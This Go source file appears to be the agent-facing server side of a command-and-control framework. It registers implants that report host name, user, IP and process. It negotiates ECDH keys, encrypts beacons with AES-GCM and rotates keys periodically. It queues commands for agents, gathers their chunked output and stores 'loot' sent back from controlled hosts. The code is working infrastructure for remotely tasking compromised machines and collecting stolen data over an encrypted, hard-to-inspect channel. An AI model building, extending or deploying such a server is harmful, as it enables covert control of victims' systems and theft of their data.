package api

import (
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"strconv"
	"strings"
	"time"

	"c2-dect/server/core"
	"c2-dect/server/crypto"
	"c2-dect/server/db"
	"c2-dect/server/profiles"

	"github.com/gin-gonic/gin"
)

// agentEnvelope is the transport frame used on the agent plane.
//
//	session_id - identity of the session
//	public_key - hex ECDH public key, present on (re)key exchanges
//	agent      - hello payload, only used on the very first plaintext contact
//	data       - base64 of AES-256-GCM(nonce||ciphertext)
type agentEnvelope struct {
	SessionID string      `json:"session_id"`
	PublicKey string      `json:"public_key,omitempty"`
	Agent     *agentHello `json:"agent,omitempty"`
	Data      string      `json:"data,omitempty"`
}

// agentHello is the plaintext first contact of an agent.
type agentHello struct {
	Hostname   string `json:"hostname"`
	Username   string `json:"username"`
	InternalIP string `json:"internal_ip"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	PID        int    `json:"pid"`
	Process    string `json:"process"`
	SleepSec   int    `json:"sleep_sec"`
	Jitter     int    `json:"jitter"`
	Version    string `json:"agent_version"`
	ExpiryUnix int64  `json:"expiry_unix"`
	Token      string `json:"token,omitempty"`
}

// agentBody is the encrypted payload of the agent plane.
type agentBody struct {
	Type       string `json:"type"` // checkin | pull | result
	Hello      *agentHello `json:"hello,omitempty"`
	TaskID     int64  `json:"task_id,omitempty"`
	Output     string `json:"output,omitempty"`
	Error      string `json:"error,omitempty"`
	Success    bool   `json:"success,omitempty"`
	ChunkIndex int    `json:"chunk_index,omitempty"`
	ChunkTotal int    `json:"chunk_total,omitempty"`
	LootType   string `json:"loot_type,omitempty"`
	LootName   string `json:"loot_name,omitempty"`
	LootData   string `json:"loot_data,omitempty"`
}

// checkinAck is the encrypted answer to a checkin.
type checkinAck struct {
	Type       string             `json:"type"`
	SessionID  string             `json:"session_id"`
	UUID       string             `json:"uuid"`
	SleepSec   int                `json:"sleep_sec"`
	Jitter     int                `json:"jitter"`
	Profile    *profiles.AgentProfile `json:"profile,omitempty"`
	ServerTime string             `json:"server_time"`
	TenantID   int64              `json:"tenant_id"`
	Task       *core.TaskRequest  `json:"task,omitempty"`
}

// taskEnvelope carries a task to an agent.
type taskEnvelope struct {
	Type string           `json:"type"`
	Task *core.TaskRequest `json:"task,omitempty"`
}

// rotationEvery is the number of beacons after which the transport key is
// renegotiated. A non positive value disables the automatic rotation.
var rotationEvery = 200

func init() {
	if v, err := strconv.Atoi(strings.TrimSpace(envOr("C2_KEY_ROTATION_EVERY", "200"))); err == nil {
		rotationEvery = v
	}
}

// handleAgentCheckin registers or refreshes a session and hands over the next
// pending task.
func (s *Server) handleAgentCheckin(c *gin.Context) {
	var env agentEnvelope
	if err := c.ShouldBindJSON(&env); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid beacon"})
		return
	}
	if env.SessionID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session_id required"})
		return
	}

	// --- encrypted contact ---
	if env.Data != "" {
		key, prev, _ := s.sessions.GetAESKey(env.SessionID)
		plain, err := crypto.Open(key, env.Data)
		if err != nil && len(prev) > 0 {
			plain, err = crypto.Open(prev, env.Data)
		}
		if err != nil {
			// The server lost its key material (restart): ask for a re-key.
			c.JSON(http.StatusConflict, gin.H{"error": "rekey_required"})
			return
		}
		var body agentBody
		if err := json.Unmarshal(plain, &body); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload"})
			return
		}
		if body.Type != "checkin" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "unsupported payload type"})
			return
		}
		hello := body.Hello
		if hello == nil {
			hello = &agentHello{}
		}
		s.agentCheckin(c, env.SessionID, hello, env.PublicKey)
		return
	}

	// --- plaintext first contact ---
	if env.Agent == nil || env.PublicKey == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "first contact requires agent payload and public key"})
		return
	}
	s.agentCheckin(c, env.SessionID, env.Agent, env.PublicKey)
}

// agentCheckin performs the registration, the key negotiation and the answer.
func (s *Server) agentCheckin(c *gin.Context, sessionID string, hello *agentHello, agentPubHex string) {
	session, err := s.db.GetSession(sessionID)
	if err != nil && !errors.Is(err, db.ErrNotFound) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "session lookup failed"})
		return
	}

	// --- tenant resolution ---
	tenantID := int64(db.DefaultTenantID)
	if session != nil {
		tenantID = session.TenantID
	}
	if hello.Token != "" {
		resolved, err := s.db.ResolveAgentToken(hashToken(hello.Token))
		if err != nil {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid agent token"})
			return
		}
		tenantID = resolved
	}

	// --- key negotiation ---
	serverPubHex := ""
	if agentPubHex != "" {
		agentPub, err := crypto.ParsePublicKey(agentPubHex)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid public key"})
			return
		}
		priv := s.sessions.GetPrivateKey(sessionID)
		if priv == nil {
			priv, err = crypto.GenerateKeyPair()
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "key generation failed"})
				return
			}
		}
		shared, err := crypto.DeriveKey(priv, agentPub, sessionID)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "key derivation failed"})
			return
		}
		s.sessions.StoreKeyPair(sessionID, priv, shared, s.sessions.Epoch(sessionID))
		_ = s.db.SetSessionAgentKey(sessionID, agentPub.Bytes(), s.sessions.Epoch(sessionID))
		serverPubHex = crypto.PublicKeyHex(priv.PublicKey())
	}

	// --- session registration ---
	if session == nil {
		session = &db.Session{
			ID:       sessionID,
			UUID:     newUUID(),
			Hostname: hello.Hostname,
			Username: hello.Username,
			OS:       hello.OS,
			Arch:     hello.Arch,
			PID:      hello.PID,
			Process:  hello.Process,
			TenantID: tenantID,
		}
	}
	session.InternalIP = hello.InternalIP
	session.OS = hello.OS
	session.Arch = hello.Arch
	session.PID = hello.PID
	session.Process = hello.Process
	session.SleepSec = hello.SleepSec
	session.Jitter = hello.Jitter
	session.AgentVersion = hello.Version
	session.ExpiryUnix = hello.ExpiryUnix
	session.TenantID = tenantID
	if err := s.db.RegisterSession(session); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "session registration failed"})
		return
	}
	_ = s.db.UpdateSessionCheckIn(sessionID, c.ClientIP())

	// --- automatic key rotation ---
	checkins := s.sessions.CountCheckin(sessionID)
	if rotationEvery > 0 && checkins > 0 && checkins%rotationEvery == 0 {
		stored, _, err := s.db.GetSessionAgentKey(sessionID)
		if err == nil && len(stored) > 0 {
			serverPubHex = s.rotateSessionKey(c, sessionID, hex.EncodeToString(stored))
		}
	}

	// --- next task ---
	profile := s.profiles.GetDefault()
	ack := &checkinAck{
		Type:       "checkin_ack",
		SessionID:  sessionID,
		UUID:       session.UUID,
		SleepSec:   profile.DefaultSleep,
		Jitter:     profile.Jitter,
		Profile:    s.profiles.AgentProfileFor(profile.Name),
		ServerTime: time.Now().UTC().Format(time.RFC3339),
		TenantID:   tenantID,
	}
	if task, err := s.db.GetNextTask(sessionID); err == nil && task != nil {
		ack.Task = &core.TaskRequest{ID: task.ID, Command: task.Command, Args: task.Args}
	}

	s.agentReply(c, sessionID, serverPubHex, ack)
}

// rotateSessionKey renegotiates the transport key of a session.
func (s *Server) rotateSessionKey(c *gin.Context, sessionID, agentPubHex string) string {
	if agentPubHex == "" {
		return ""
	}
	agentPub, err := crypto.ParsePublicKey(agentPubHex)
	if err != nil {
		return ""
	}
	priv, err := crypto.GenerateKeyPair()
	if err != nil {
		return ""
	}
	shared, err := crypto.DeriveKey(priv, agentPub, sessionID)
	if err != nil {
		return ""
	}
	s.sessions.Rotate(sessionID, priv, shared)
	return crypto.PublicKeyHex(priv.PublicKey())
}

// agentReply encrypts the answer for an agent.
func (s *Server) agentReply(c *gin.Context, sessionID, serverPubHex string, body any) {
	payload, err := json.Marshal(body)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "encoding failed"})
		return
	}
	key, prev, _ := s.sessions.GetAESKey(sessionID)
	encoded, err := crypto.Seal(key, payload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "encryption failed"})
		return
	}
	_ = prev
	c.JSON(http.StatusOK, agentEnvelope{SessionID: sessionID, PublicKey: serverPubHex, Data: encoded})
}

// handleAgentGetTask hands the next pending task to an agent.
func (s *Server) handleAgentGetTask(c *gin.Context) {
	var env agentEnvelope
	if err := c.ShouldBindJSON(&env); err != nil && c.Request.ContentLength > 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}
	sessionID := env.SessionID
	if sessionID == "" {
		sessionID = c.Query("session_id")
	}
	if sessionID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session_id required"})
		return
	}

	key, prev, _ := s.sessions.GetAESKey(sessionID)
	if env.Data != "" {
		_, err := crypto.Open(key, env.Data)
		if err != nil && len(prev) > 0 {
			_, err = crypto.Open(prev, env.Data)
		}
		if err != nil {
			c.JSON(http.StatusConflict, gin.H{"error": "rekey_required"})
			return
		}
	}

	_ = s.db.UpdateSessionCheckIn(sessionID, c.ClientIP())
	task, err := s.db.GetNextTask(sessionID)
	if err != nil || task == nil {
		s.agentReply(c, sessionID, "", &taskEnvelope{Type: "no_tasks"})
		return
	}
	s.agentReply(c, sessionID, "", &taskEnvelope{
		Type: "task",
		Task: &core.TaskRequest{ID: task.ID, Command: task.Command, Args: task.Args},
	})
}

// handleAgentResult stores the answer of an agent.
func (s *Server) handleAgentResult(c *gin.Context) {
	var env agentEnvelope
	if err := c.ShouldBindJSON(&env); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}
	if env.SessionID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session_id required"})
		return
	}

	key, prev, _ := s.sessions.GetAESKey(env.SessionID)
	plain, err := crypto.Open(key, env.Data)
	if err != nil && len(prev) > 0 {
		plain, err = crypto.Open(prev, env.Data)
	}
	if err != nil {
		c.JSON(http.StatusConflict, gin.H{"error": "rekey_required"})
		return
	}
	var body agentBody
	if err := json.Unmarshal(plain, &body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload"})
		return
	}
	if body.Type != "result" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "unsupported payload type"})
		return
	}

	total := body.ChunkTotal
	if total <= 0 {
		total = 1
	}
	if body.ChunkIndex < total {
		if err := s.db.AppendTaskChunk(body.TaskID, body.Output, body.ChunkIndex, total); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "result storage failed"})
			return
		}
		if body.ChunkIndex < total-1 {
			// more chunks are on the way, the task stays open
			s.agentReply(c, env.SessionID, "", &taskEnvelope{Type: "ack"})
			return
		}
	}
	if body.ChunkIndex >= total-1 {
		if err := s.db.FinishTask(body.TaskID, body.Error); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "result storage failed"})
			return
		}
	}

	_ = s.db.UpdateSessionCheckIn(env.SessionID, c.ClientIP())

	if body.LootType != "" {
		loot := &db.Loot{
			SessionID: env.SessionID,
			Type:      body.LootType,
			Name:      body.LootName,
			Data:      []byte(body.LootData),
		}
		if session, err := s.db.GetSession(env.SessionID); err == nil {
			loot.TenantID = session.TenantID
		}
		_ = s.db.SaveLoot(loot)
	}

	s.agentReply(c, env.SessionID, "", &taskEnvelope{Type: "ack"})
}

// handleAgentKeyExchange keeps the 1.x endpoint alive for old agents. The key
// material it produces is discarded: 2.0 agents derive the transport key from
// the ECDH exchange performed during the checkin.
func (s *Server) handleAgentKeyExchange(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": "deprecated", "hint": "use /agent/checkin with an ECDH public key"})
}
